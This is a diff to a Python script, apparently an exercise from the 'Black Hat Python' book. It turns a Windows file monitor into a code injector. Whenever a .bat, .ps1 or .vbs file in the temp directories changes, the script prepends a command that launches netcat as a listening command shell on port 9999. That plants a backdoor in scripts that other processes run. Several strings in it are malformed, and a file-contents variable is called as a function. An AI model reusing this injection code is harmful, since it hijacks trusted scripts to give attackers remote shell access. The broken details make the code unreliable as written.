@@ -1,13 +1,10 @@
 #!/usr/bin/env python
 """
-Winning the Rat Race (Windows File Monitor)
-BHP page 162
+Code Injection (file monitor version 2)
+BHP page 164
 
-Note from BHP book: modified example that is originally given here:
-https://timgolden.me.uk/python/win32_how_do_i/watch_directory_for_changes.html
-## This link no longer works
-
-Mirror site: http://mirror.krakadikt.com/2007-06-23-pythonandwmi/tgolden.sc.sabren.com/python/index.html
+Note: create executable from netcat.py
+# pyinstaller -F netcat.py
 
 """
 
@@ -22,6 +19,30 @@ FILE_DELETED = 2
 FILE_MODIFIED = 3
 FILE_RENAMED_FROM = 4
 FILE_RENAMED_TO = 5
+
+NETCAT = 'c:\\users\tim\work\\netcat.exe'
+TGT_IP = '192.168.1.208'
+CMD = f'{NETCAT} -t {TGT_IP} -p 9999 -l -c'
+
+
+FILE_TYPES = {
+    '.bat': ["r\nREM bhpmarker\r\n", r'\r\n{CMD}'],
+    '.ps1': ["\r\n#bhpmarker\r\n", f'\r\nStart-Process "{CMD}"\r\n'],
+    '.vbs': ["\r]n[bhpmarker\r\n",
+             f'\r\nnCreateObject("Wscript.shell").Run({CMD}")\r\n'], }
+
+
+def inject_code(full_filename, contents, extension):
+    if FILE_TYPES[extension][0].strip() in contents():
+        return
+
+    full_contents = FILE_TYPES[extension][0]
+    full_contents += FILE_TYPES[extension][1]
+    full_contents += contents
+    with open(full_filename, 'w') as f:
+        f.write(full_contents)
+    print('\\o/ Injected Code')
+
 
 FILE_LIST_DIRECTORY = 0x0001
 PATHS = ['c:\\WINDOWS\\Temp', tempfile.gettempdir()]
@@ -61,15 +82,17 @@ def monitor(path_to_watch):
                     print(f'[-] Deleted {full_filename}')
                 elif action == FILE_MODIFIED:
                     print(f'[*] Modified {full_filename}')
-                    try:
-                        print('[vvv] Dumping contents... ')
-                        with open(full_filename) as f:
-                            contents = f.read()
-                        print(contents)
-                        print('[^^^] Dump complete. ')
-                    except Exception as e:
-                        print(f'[!!!] Dump failed. {e}')
-
+                    extension = os.path.splitext(full_filename)[1]
+                    if extension in FILE_TYPES:
+                        try:
+                            with open(full_filename) as f:
+                                contents = f.read()
+                            print('[vvv] Dumping contents ... ')
+                            inject_code(full_filename, contents, extension)
+                            # print(contents)
+                            print('[^^^] Dump complete.')
+                        except Exception as e:
+                            print('[!!!] dump failed. {e}')
                 elif action == FILE_RENAMED_FROM:
                     print(f'[>] Renamed from {full_filename}')
                 elif action == FILE_RENAMED_TO:
